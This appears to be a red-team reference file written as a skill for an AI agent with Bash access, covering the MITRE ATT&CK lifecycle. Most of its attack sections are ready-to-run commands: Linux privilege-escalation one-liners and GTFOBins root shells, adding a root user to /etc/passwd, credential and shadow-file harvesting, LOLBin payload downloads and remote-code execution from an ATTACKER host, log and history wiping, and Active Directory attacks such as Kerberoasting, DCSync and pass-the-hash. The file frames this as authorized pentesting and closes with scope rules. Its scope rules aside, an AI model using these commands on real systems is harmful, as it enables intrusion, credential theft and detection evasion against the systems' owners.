---
ref-name: red-team-tactics
description: Red team tactics based on MITRE ATT&CK framework. Full attack lifecycle, detection evasion, lateral movement, post-exploitation, and C2 patterns.
allowed-tools: Read, Bash, Glob, Grep
---

# Red Team Tactics — MITRE ATT&CK v14

## 1. MITRE ATT&CK Full Lifecycle

```
RECONNAISSANCE -> RESOURCE DEVELOPMENT -> INITIAL ACCESS
      |                    |                   |
 EXECUTION -> PERSISTENCE -> PRIVILEGE ESCALATION -> DEFENSE EVASION
      |                                                |
CREDENTIAL ACCESS -> DISCOVERY -> LATERAL MOVEMENT -> COLLECTION
      |                                                |
  COMMAND & CONTROL -> EXFILTRATION -> IMPACT
```

### Phase Objectives & Key Techniques

| Phase | Objective | Key Techniques |
|-------|-----------|----------------|
| Recon | Map attack surface | T1595 Active Scanning, T1592 Gather Victim Info |
| Initial Access | First foothold | T1190 Exploit Public App, T1133 External Remote Services |
| Execution | Run code | T1059 Command/Script Interpreter, T1203 Client Execution |
| Persistence | Survive reboots | T1053 Scheduled Tasks, T1543 Create Service, T1546 Event Triggered |
| Privilege Escalation | Get admin/root | T1068 Exploit Privilege Escalation, T1078 Valid Accounts |
| Defense Evasion | Avoid detection | T1070 Indicator Removal, T1036 Masquerading, LOLBins |
| Credential Access | Harvest creds | T1003 OS Credential Dumping, T1552 Unsecured Credentials |
| Discovery | Map internals | T1082 System Info, T1083 File Discovery, T1046 Network Scan |
| Lateral Movement | Spread | T1021 Remote Services, T1550 Pass-the-Hash/Ticket |
| Collection | Gather data | T1005 Local Data, T1039 Network Shares |
| C2 | Maintain channel | T1071 App Layer Protocol, T1572 Protocol Tunneling |
| Exfiltration | Extract data | T1041 Over C2, T1048 Non-App Layer Protocol |

---

## 2. Linux Privilege Escalation — Full Checklist

### Automated
```bash
# LinPEAS (most comprehensive)
curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash > /tmp/lpe.txt
# Key sections: RED/YELLOW = 99% PE vector

# Linux Exploit Suggester
curl -sL https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh | bash
```

### Manual Checklist (fastest paths first)
```bash
# 1. What can we sudo?
sudo -l
# -> NOPASSWD entries -> GTFOBins immediately

# 2. SUID binaries
find / -perm -4000 2>/dev/null
# -> Cross-reference with GTFOBins

# 3. Capabilities
getcap -r / 2>/dev/null
# -> cap_setuid+ep on python/perl/ruby -> instant root

# 4. Writable cron jobs
cat /etc/crontab; ls -la /etc/cron* /var/spool/cron/crontabs/ 2>/dev/null
# -> Append reverse shell to writable cron script

# 5. Credentials in files
grep -rnw / -ie "password\|passwd\|secret\|api_key\|token" 2>/dev/null \
  | grep -v "^Binary\|/proc\|/sys\|/dev" | head -30

# 6. Environment variables
env | grep -iE "pass|key|secret|token|api"
cat /proc/*/environ 2>/dev/null | tr '\0' '\n' | grep -i pass

# 7. SSH keys
find / -name "id_rsa" -o -name "id_ed25519" -o -name "id_ecdsa" 2>/dev/null

# 8. Kernel version
uname -r
# -> Check against: DirtyCow (2.x-4.8), DirtyPipe (5.8-5.16.11)
# -> CVE-2022-0847 (DirtyPipe), CVE-2023-0386 (OverlayFS), CVE-2021-4034 (PwnKit)

# 9. NFS no_root_squash
cat /etc/exports | grep no_root_squash

# 10. Docker group
id | grep docker
# -> docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# 11. Writable /etc/passwd
ls -la /etc/passwd
# -> echo "hacker:$(openssl passwd -1 hacked):0:0:root:/root:/bin/bash" >> /etc/passwd

# 12. Readable /etc/shadow
cat /etc/shadow 2>/dev/null
# -> hashcat -m 1800 hash.txt rockyou.txt (sha512crypt)
```

### GTFOBins Quick Reference

```bash
# bash (sudo): sudo bash
# python3 (SUID): python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
# python3 (sudo): sudo python3 -c 'import os; os.system("/bin/bash")'
# vim (sudo): sudo vim -c ':!/bin/bash'
# less (sudo): sudo less /etc/hosts -> (inside) !/bin/bash
# find (sudo/SUID): sudo find . -exec /bin/sh \; -quit
# awk (sudo): sudo awk 'BEGIN {system("/bin/bash")}'
# nmap (SUID): echo 'os.execute("/bin/bash")' > /tmp/shell.nse; nmap --script=/tmp/shell.nse
# perl (sudo): sudo perl -e 'exec "/bin/bash"'
# ruby (sudo): sudo ruby -e 'exec "/bin/bash"'
# tar (sudo): sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
# zip (sudo): sudo zip /tmp/nothing.zip /tmp/nothing -T --unzip-command="sh -c /bin/bash"
# env (sudo): sudo env /bin/bash
# cp (SUID): cp /bin/bash /tmp/bash && chmod u+s /tmp/bash && /tmp/bash -p
# tee (write): echo "hacker::0:0::/root:/bin/bash" | sudo tee -a /etc/passwd
# wget (SUID): wget -O /etc/shadow http://ATTACKER/passwd
# curl (sudo): sudo curl file:///etc/shadow
# node (sudo): sudo node -e 'require("child_process").spawn("/bin/bash",{stdio:[0,1,2]})'
```

---

## 3. Defense Evasion

### LOLBins (Living off the Land)
```bash
# Windows
certutil -urlcache -split -f http://ATTACKER/payload.exe C:\Windows\Temp\p.exe
bitsadmin /transfer job http://ATTACKER/payload.exe C:\Temp\p.exe
powershell -enc [BASE64_ENCODED_COMMAND]
mshta http://ATTACKER/payload.hta
wscript.exe //E:jscript http://ATTACKER/payload.js

# Linux
wget http://ATTACKER/payload -O /tmp/.hidden
curl http://ATTACKER/payload | bash
python3 -c "import urllib.request; exec(urllib.request.urlopen('http://ATTACKER/x.py').read())"
```

### Operational Security
- Work during business hours (blend with normal traffic)
- Use HTTPS/DNS for C2 (blend with normal traffic)
- Avoid writing to disk when possible (memory-only payloads)
- Timestomp modified files
- Clear bash history: history -c; history -w
- Use legitimate admin tools (psexec, wmiexec, winrm)

---

## 4. Active Directory Attacks

```bash
# Kerberoasting — request service tickets for offline cracking
docker exec kali-pentest bash -c "impacket-GetUserSPNs DOMAIN/USER:PASS@DC_IP -dc-ip DC_IP -request -outputfile /reports/spns.txt"
# Then: hashcat -m 13100 spns.txt rockyou.txt

# AS-REP Roasting — accounts without pre-auth
docker exec kali-pentest bash -c "impacket-GetNPUsers DOMAIN/ -dc-ip DC_IP -no-pass -usersfile /reports/users.txt -format hashcat -outputfile /reports/asrep.txt"

# DCSync (requires Domain Admin equivalent)
docker exec kali-pentest bash -c "impacket-secretsdump DOMAIN/USER:PASS@DC_IP -just-dc"

# Pass-the-Hash
docker exec kali-pentest bash -c "impacket-psexec DOMAIN/USER@TARGET -hashes :NTLM_HASH"

# BloodHound collection
docker exec kali-pentest bash -c "bloodhound-python -d DOMAIN -u USER -p PASS -dc DC_IP -c All --zip"
```

---

## 5. Reporting Principles

### Attack Narrative Structure
1. How initial access was gained (technique, CVE, payload)
2. What enumeration discovered (services, accounts, data)
3. What techniques achieved privilege escalation
4. What lateral movement was possible
5. What data was accessible (stop at proof-of-concept)
6. Where detection failed (what should have alerted, didn't)

### Detection Gap Analysis
For each successful technique:
- What security control should have detected it?
- Why didn't detection fire?
- Specific SIEM rule or EDR signature to add

---

## 6. Ethical Boundaries

### ALWAYS
- Stay within written scope
- Stop immediately if real breach risk identified
- Document all actions with timestamps
- Report critical findings immediately (don't wait for final report)

### NEVER
- Destroy production data
- Cause DoS unless explicitly in scope
- Access data beyond proof of concept
- Retain sensitive data post-engagement
- Disclose findings publicly before remediation
